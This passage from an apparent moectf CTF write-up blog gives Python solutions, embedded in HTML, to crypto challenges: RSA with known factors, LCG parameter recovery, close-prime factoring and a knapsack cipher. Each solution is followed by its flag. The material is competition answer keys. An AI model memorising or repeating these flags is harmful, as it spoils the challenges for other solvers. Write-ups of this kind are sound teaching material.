operator\">=</span> <span class=\"token number\">0x10001</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>flag<span class=\"token operator\">=</span><span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span>gmpy2<span class=\"token punctuation\">.</span>invert<span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span>p<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>q<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>p<span class=\"token operator\">*</span>q<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>long_to_bytes<span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\">#moectf&#123;w0w_yOU_Know_h0w_70_d3crypt_th3_RSA&#125;</span></pre></td></tr></table></figure><blockquote>\n<p><em><strong>PRintNewG</strong></em></p>\n<blockquote>\n<p><s>做的最痛苦的一道题・・・・・・</s><br />\n观察一下代码，是要解一个方程组，假设 flag 是 m0 的话，那么就是要解如下方程组：<br />\n(am0+b)%n=m1<br />\n(am1+b)%n=m2<br />\n(am2+b)%n=m3<br />\n 这里要了解一下乘法逆元的概念。<br />\n方程 ax% n=1, 那么求 x 就叫求 a 关于 n 的乘法逆元。<br />\n而对 ay% n=m，求出 a 关于 n 的乘法逆元后再乘以 m 模 n 即可。<br />\n此处的 b 可以用两个方程组相减来消去 b，得到如下两个方程：<br />\na(m0-m1)%n=m2-m1<br />\na(m2-m1)%n=m2-m3<br />\n 那么就可以直接当成二元方程组求解即可。</p>\n</blockquote>\n</blockquote>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span><span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> gmpy2</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>n<span class=\"token operator\">=</span><span class=\"token number\">164955381960104851576442781839629371483790790743830073857213053104860144345367</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>m1<span class=\"token operator\">=</span><span class=\"token number\">67066424717605861916529090048670931008913194546199003522357504998012803616537</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>m2<span class=\"token operator\">=</span><span class=\"token number\">14585402872351563180055857554749250191721167730349724393021149201170995608751</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>m3<span class=\"token operator\">=</span><span class=\"token number\">68393939370424772490169906192546208899639826391163845848999554903218827210979</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>a<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span>gmpy2<span class=\"token punctuation\">.</span>invert<span class=\"token punctuation\">(</span>m2<span class=\"token operator\">-</span>m1<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>m3<span class=\"token operator\">-</span>m2<span class=\"token punctuation\">)</span><span class=\"token operator\">%</span>n</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>m<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>gmpy2<span class=\"token punctuation\">.</span>invert<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>m1<span class=\"token operator\">-</span>m2<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>m1<span class=\"token punctuation\">)</span><span class=\"token operator\">%</span>n</pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>long_to_bytes<span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token comment\">#moectf&#123;PR1nt_N3w_G_s0_e45y&#125;</span></pre></td></tr></table></figure><blockquote>\n<p><em><strong>NumberTheory-FeeeeeMa</strong></em></p>\n<blockquote>\n<p><s>虽然叫费马，但考的还是 RSA~</s><br />\n 扔到 kafu 里分解一下 n：<br />\nPRP617 = 19283057560629238193074608948196301223350201847222196402737537143121425317730486716068722286654190001952369093090081343313799571068008460938887101338032695456530086089154736812933510497087528596022484804860301935123425283243570950209590727297843775205178712560791816849702359490660765666544417910788968742654156070723140800392112743461501566752095206321903852202148826414101280864051684149726194087223728037750495558021865046068965219079941837883220009399934492981566439903512479087624251270587165899645259193043162046541946253111129504269329740364176081037121431605940093408252027961675192279921542388792148531562041<br />\nPRP617 = 19283057560629238193074608948196301223350201847222196402737537143121425317730486716068722286654190001952369093090081343313799571068008460938887101338032695456530086089154736812933510497087528596022484804860301935123425283243570950209590727297843775205178712560791816849702359490660765666544417910788968742654156070723140800392112743461501566752095206321903852202148826414101280864051684149726194087223728037750495558021865046068965219079941837883220009399934492981566439903512479087624251270587165899645259193043162046541946253111129504269329740364176081037121431605940093408252027961675192279921542388792148531561919<br />\n 直接上手：</p>\n</blockquote>\n</blockquote>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> gmpy2</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>e <span class=\"token operator\">=</span> <span class=\"token number\">0x10001</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>c<span class=\"token operator\">=</span><span class=\"token number\">5883797662470459824355663245986072888499217007658131616834157815812099907584034205088255553387720712715657503553785084616903197734118992506040765948815581238738585159640841277023597023582148173041980600751980206228524475872232080917683822098342300418744639304147771013376863895727877847094151770079046205501266017838881847833528612089868825489776289686550273385136080255799772961155599801690997753649087689949021276549323525754963020408864310302166537661098308581259246052869844362142747080042122189010627048397501817473817946566885487595098504403459522534124404289032779842658407728856164570059823567667669076044563549721918886430160041337156249733571322684187916005175717585587552966989348534775572282369273898182367851689305440672199427492706130124832744127722533758962606513875787129378871099575729793745175327897215145024490319291830298017471555440811147903390803597635585696411407922981136489077349754222355529320548946411677051716584081079246752768224289803323109047467790868885987703125118276891234633889937243303027095375365791207055516900563280115276282761652663098154769929217653527103304045922204641545963828632051715956492613217136463227530538723452005224696385225174844198627387638874395654771260577791169209134146482</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>p<span class=\"token operator\">=</span><span class=\"token number\">19283057560629238193074608948196301223350201847222196402737537143121425317730486716068722286654190001952369093090081343313799571068008460938887101338032695456530086089154736812933510497087528596022484804860301935123425283243570950209590727297843775205178712560791816849702359490660765666544417910788968742654156070723140800392112743461501566752095206321903852202148826414101280864051684149726194087223728037750495558021865046068965219079941837883220009399934492981566439903512479087624251270587165899645259193043162046541946253111129504269329740364176081037121431605940093408252027961675192279921542388792148531562041</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>q<span class=\"token operator\">=</span><span class=\"token number\">19283057560629238193074608948196301223350201847222196402737537143121425317730486716068722286654190001952369093090081343313799571068008460938887101338032695456530086089154736812933510497087528596022484804860301935123425283243570950209590727297843775205178712560791816849702359490660765666544417910788968742654156070723140800392112743461501566752095206321903852202148826414101280864051684149726194087223728037750495558021865046068965219079941837883220009399934492981566439903512479087624251270587165899645259193043162046541946253111129504269329740364176081037121431605940093408252027961675192279921542388792148531561919</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>flag<span class=\"token operator\">=</span><span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span>gmpy2<span class=\"token punctuation\">.</span>invert<span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span>p<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>q<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>p<span class=\"token operator\">*</span>q<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>long_to_bytes<span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\">#moectf&#123;y0u_c4n_e4s1ly_f4ctor_th3_N&#125;</span></pre></td></tr></table></figure><blockquote>\n<p>BBBBBBBackpack</p>\n<blockquote>\n<p>不是很懂背包，这个题倒着依次乘一下加回去就好了。<br />\n<s>我也不知道什么背包问题？？？</s></p>\n</blockquote>\n</blockquote>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>flag<span class=\"token operator\">=</span><span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>backpack<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">6</span><span class=\"token punctuation\">,</span> <span class=\"token number\">23</span><span class=\"token punctuation\">,</span> <span class=\"token number\">81</span><span class=\"token punctuation\">,</span> <span class=\"token number\">199</span><span class=\"token punctuation\">,</span> <span class=\"token number\">670</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1844</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5535</span><span class=\"token punctuation\">,</span> <span class=\"token number\">19547</span><span class=\"token punctuation\">,</span> <span class=\"token number\">75437</span><span class=\"token punctuation\">,</span> <span class=\"token number\">259056</span><span class=\"token punctuation\">,</span> <span class=\"token number\">974664</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2399609</span><span class=\"token punctuation\">,</span> <span class=\"token number\">7304021</span><span class=\"token punctuation\">,</span> <span class=\"token number\">18537736</span><span class=\"token punctuation\">,</span> <span class=\"token number\">38733276</span><span class=\"token punctuation\">,</span> <span class=\"token number\">143785607</span><span class=\"token punctuation\">,</span> <span class=\"token number\">300890806</span><span class=\"token punctuation\">,</span> <span class=\"token number\">778420517</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3112554961</span><span class=\"token punctuation\">,</span> <span class=\"token number\">9955080778</span><span class=\"token punctuation\">,</span> <span class=\"token number\">34625138877</span><span class=\"token punctuation\">,</span> <span class=\"token number\">103531993246</span><span class=\"token punctuation\">,</span> <span class=\"token number\">294207209833</span><span class=\"token punctuation\">,</span> <span class=\"token number\">632363887456</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2341888528510</span><span class=\"token punctuation\">,</span> <span class=\"token number\">8736224869982</span><span class=\"token punctuation\">,</span> <span class=\"token number\">33727228149167</span><span class=\"token punctuation\">,</span> <span class=\"token number\">113026240109398</span><span class=\"token punctuation\">,</span> <span class=\"token number\">334534210335245</span><span class=\"token punctuation\">,</span> <span class=\"token number\">754812282783351</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2871232541211362</span><span class=\"token punctuation\">,</span> <span class=\"token number\">7147990367228081</span><span class=\"token punctuation\">,</span> <span class=\"token number\">16813142520913249</span><span class=\"token punctuation\">,</span> <span class=\"token number\">62232346665698392</span><span class=\"token punctuation\">,</span> <span class=\"token number\">132813746566508109</span><span class=\"token punctuation\">,</span> <span class=\"token number\">436969187287191174</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1371311321857557068</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3465499917202578303</span><span class=\"token punctuation\">,</span> <span class=\"token number\">10761115866584374884</span><span class=\"token punctuation\">,</span> <span class=\"token number\">25998484366411649657</span><span class=\"token punctuation\">,</span> <span class=\"token number\">81986464388691181616</span><span class=\"token punctuation\">,</span> <span class=\"token number\">324842980726420787162</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1063428202306999892763</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3318046410585817603032</span><span class=\"token punctuation\">,</span> <span class=\"token number\">12569059003729082352479</span><span class=\"token punctuation\">,</span> <span class=\"token number\">29822650425811094387624</span><span class=\"token punctuation\">,</span> <span class=\"token number\">89829868596281155601134</span><span class=\"token punctuation\">,</span> <span class=\"token number\">207467076929560545986692</span><span class=\"token punctuation\">,</span> <span class=\"token number\">424101883375592006882573</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1410057940679583010646572</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4795250448769489602371933</span><span class=\"token punctuation\">,</span> <span class=\"token number\">12419955465903295439689190</span><span class=\"token punctuation\">,</span> <span class=\"token number\">32127052925660652338148413</span><span class=\"token punctuation\">,</span> <span class=\"token number\">121768246803017981541739592</span><span class=\"token punctuation\">,</span> <span class=\"token number\">286293639144639999224246905</span><span class=\"token punctuation\">,</span> <span class=\"token number\">876618562849333372078886060</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3495370549956845610130431964</span><span class=\"token punctuation\">,</span> <span class=\"token number\">13777448384830441398471073019</span><span class=\"token punctuation\">,</span> <span class=\"token number\">45339968634224370226443992856</span><span class=\"token punctuation\">,</span> <span class=\"token number\">159636974047457043534720001443</span><span class=\"token punctuation\">,</span> <span class=\"token number\">403806399587759901542286515690</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1190949464093267805434271517577</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2625636206558220580206955200643</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5447410189447132699195152662348</span><span class=\"token punctuation\">,</span> <span class=\"token number\">13798370097217657917056458399390</span><span class=\"token punctuation\">,</span> <span class=\"token number\">42652195271813913821236091812630</span><span class=\"token punctuation\">,</span> <span class=\"token number\">87624112365004035907264763291796</span><span class=\"token punctuation\">,</span> <span class=\"token number\">295833079631922620770335225824586</span><span class=\"token punctuation\">,</span> <span class=\"token number\">717255284196409248439771704866883</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2119024457898120787521595829459142</span><span class=\"token punctuation\">,</span> <span class=\"token number\">8097762744600097674390735606807128</span><span class=\"token punctuation\">,</span> <span class=\"token number\">22990496332708170421088808438995636</span><span class=\"token punctuation\">,</span> <span class=\"token number\">55268619563994680834441597248247582</span><span class=\"token punctuation\">,</span> <span class=\"token number\">157779112538179073738464223501777499</span><span class=\"token punctuation\">,</span> <span class=\"token number\">553561084981889545670380643023607621</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2094594867042850711386606235023415160</span><span class=\"token punctuation\">,</span> <span class=\"token number\">7427564397983932982484534762285032864</span><span class=\"token punctuation\">,</span> <span class=\"token number\">28541899514275079822011638819911534081</span><span class=\"token punctuation\">,</span> <span class=\"token number\">59854615377110931361953157015440306520</span><span class=\"token punctuation\">,</span> <span class=\"token number\">137071568336121640486639449884477676903</span><span class=\"token punctuation\">,</span> <span class=\"token number\">434368553369190183317274206512577489165</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1607515956833802196435755021284640023303</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4247439813046769661567823675143526066989</span><span class=\"token punctuation\">,</span> <span class=\"token number\">12252982336388472725165513300377051313644</span><span class=\"token punctuation\">,</span> <span class=\"token number\">43586970358791422986656986286232849952290</span><span class=\"token punctuation\">,</span> <span class=\"token number\">94754002216262928157061686798919700234151</span><span class=\"token punctuation\">,</span> <span class=\"token number\">205403633516427560050027271636224615375855</span><span class=\"token punctuation\">,</span> <span class=\"token number\">727922215919878343821825296552148942903123</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1541646353685774868780093433673052445519807</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5703469721749658936787093922654529457118594</span><span class=\"token punctuation\">,</span> <span class=\"token number\">20762100689139896330208273986505541316962105</span><span class=\"token punctuation\">,</span> <span class=\"token number\">80195197197818086812949239946286778357513961</span><span class=\"token punctuation\">,</span> <span class=\"token number\">198522126001869063688321920177617046841212852</span><span class=\"token punctuation\">,</span> <span class=\"token number\">719060816608760633741229682178956301630549900</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2171712751463320729665634385979825928332317622</span><span class=\"token punctuation\">,</span> <span class=\"token number\">7968526190188064156742281507099763347000210904</span><span class=\"token punctuation\">,</span> <span class=\"token number\">20302513556821857703528100337806260797703562338</span><span class=\"token punctuation\">,</span> <span class=\"token number\">54967103106163860243927426134510653397499429384</span><span class=\"token punctuation\">,</span> <span class=\"token number\">189866376897538250029834405810321956080892995934</span><span class=\"token punctuation\">,</span> <span class=\"token number\">516088075785491414669664215795496674103100750375</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1531616665488077085604100033058238685259376456655</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4795563798371064843556375420641263389159268373753</span><span class=\"token punctuation\">,</span> <span class=\"token number\">12715206263244537077480789152826620386135239585589</span><span class=\"token punctuation\">,</span> <span class=\"token number\">45628223673569886022145657218662773486560769778049</span><span class=\"token punctuation\">,</span> <span class=\"token number\">127988774487590162169660910342623736153210927472871</span><span class=\"token punctuation\">,</span> <span class=\"token number\">429761810968391607465089641939438991272623610573254</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1694286408402338132220805654166083638884822137745848</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5577419986858786911316434594350519553014729018524982</span><span class=\"token punctuation\">,</span> <span class=\"token number\">22146179230778265190752372551893625479326089828877879</span><span class=\"token punctuation\">,</span> <span class=\"token number\">78983119075073724439850825731329386811892547014513513</span><span class=\"token punctuation\">,</span> <span class=\"token number\">165805826557531832743325076551678254671357810872202277</span><span class=\"token punctuation\">,</span> <span class=\"token number\">525687524776397669648788242907896052104054917192402349</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1596680185629512867035574394423929715498386636216930988</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3808351509446054183279144714875260973968494634290203802</span><span class=\"token punctuation\">,</span> <span class=\"token number\">10792542598439044383994436390450612942036864538927761344</span><span class=\"token punctuation\">,</span> <span class=\"token number\">31776077718298264756461043701077481610506447838959767949</span><span class=\"token punctuation\">,</span> <span class=\"token number\">69483787236434708634666641366101673156349500969799745632</span><span class=\"token punctuation\">,</span> <span class=\"token number\">212620878051727200345257734337176214877612639791408110401</span><span class=\"token punctuation\">,</span> <span class=\"token number\">565705372069455623425268706185184158331866127768259060570</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2228971348185635371906791535156337404926063871528397270892</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4859328204121938264839760465087547752629065763656619388434</span><span class=\"token punctuation\">,</span> <span class=\"token number\">14185348803209161448182653444177464165713091554806223414499</span><span class=\"token punctuation\">,</span> <span class=\"token number\">44242932119616103779840255273986809836494122475150635493273</span><span class=\"token punctuation\">,</span> <span class=\"token number\">156176016196847319874949580221731690886061627436916661422852</span><span class=\"token punctuation\">,</span> <span class=\"token number\">472567672907289753186461661432798790751774534772655287936877</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1765317440470718113352833182911767208733594355879647245836603</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5835719030771522391675663002032404790451900100534570526468736</span><span class=\"token punctuation\">,</span> <span class=\"token number\">14528961633147270325279483890277955669830128461595478399405580</span><span class=\"token punctuation\">,</span> <span class=\"token number\">53503137764341373520101774208921450303897226002280491351371881</span><span class=\"token punctuation\">,</span> <span class=\"token number\">153340302591307960181257267214621247064964249027062324798966650</span><span class=\"token punctuation\">,</span> <span class=\"token number\">467036429085212303265974827129085622046910166509299763268535756</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1760478013800716951650816419888923889893355872867499404847043361</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4791886951911545137378952129838133145784256723738609871941913863</span><span class=\"token punctuation\">,</span> <span class=\"token number\">19126760116038883506408830737976498053029475253123685318001466609</span><span class=\"token punctuation\">,</span> <span class=\"token number\">51635927378821965754946959553487670084314385367430813170544188707</span><span class=\"token punctuation\">,</span> <span class=\"token number\">203944552994591250724882161307279862158139878326498083669171922709</span><span class=\"token punctuation\">,</span> <span class=\"token number\">718868928147325949276701359623063723395455731358210896767864810436</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2005627527854915017699090052821431775394584514441537184407714355949</span><span class=\"token punctuation\">,</span> <span class=\"token number\">6108484926321410509000933490330125849664844216966621898372849074206</span><span class=\"token punctuation\">,</span> <span class=\"token number\">15273733259375332107091552084526951416159646708621190826219429490015</span><span class=\"token punctuation\">,</span> <span class=\"token number\">34145117254940196604842578208457005181132408450899191627170638987883</span><span class=\"token punctuation\">,</span> <span class=\"token number\">120825229084143066199868275091825674337472013226784591902132114229359</span><span class=\"token punctuation\">,</span> <span class=\"token number\">387687667198606192147021527980207738864855944986764666796629571317797</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1461874344207808204456192497546273455901754164965322967295868406627707</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3258300231591322626530795072101331694347928535549768492906530809069244</span><span class=\"token punctuation\">,</span> <span class=\"token number\">8874418273687545553519370439384854004509761935319681848589844232674343</span><span class=\"token punctuation\">,</span> <span class=\"token number\">26555971104148502495508475192114409958713364020252024170586326291995544</span><span class=\"token punctuation\">,</span> <span class=\"token number\">56653286369586527413345416396708661964062474995701742952261047069623359</span><span class=\"token punctuation\">,</span> <span class=\"token number\">154383566127721041301459355493059400704799197964228029280865862358894596</span><span class=\"token punctuation\">,</span> <span class=\"token number\">341393868848806018386217706353404785528207249510734290203621418976352706</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1171362524761660822765817023463786914069613269413196584856696440695273738</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4194882148022101614597714583113090146333385168895367467002069867303753334</span><span class=\"token punctuation\">,</span> <span class=\"token number\">10081717223153632058965668126630772845024206141591578024505075742926631137</span><span class=\"token punctuation\">,</span> <span class=\"token number\">39590555580101758090745061229221178837429140073072263518741551403983751377</span><span class=\"token punctuation\">,</span> <span class=\"token number\">124978669991117804453179514660098523434116842472570073354436333226196401318</span><span class=\"token punctuation\">,</span> <span class=\"token number\">285677744249355467333640461312079508294900634926466871637187648581093663108</span><span class=\"token punctuation\">,</span> <span class=\"token number\">685643590088926190360498081484403342771108281930489395367499236756131358960</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2509513194338799699151211958956210034789618340347017416940796124375457114430</span><span class=\"token punctuation\">,</span> <span class=\"token number\">7869725510782496795692771133398729561144872690341264618424961946628895219979</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>l_list<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token 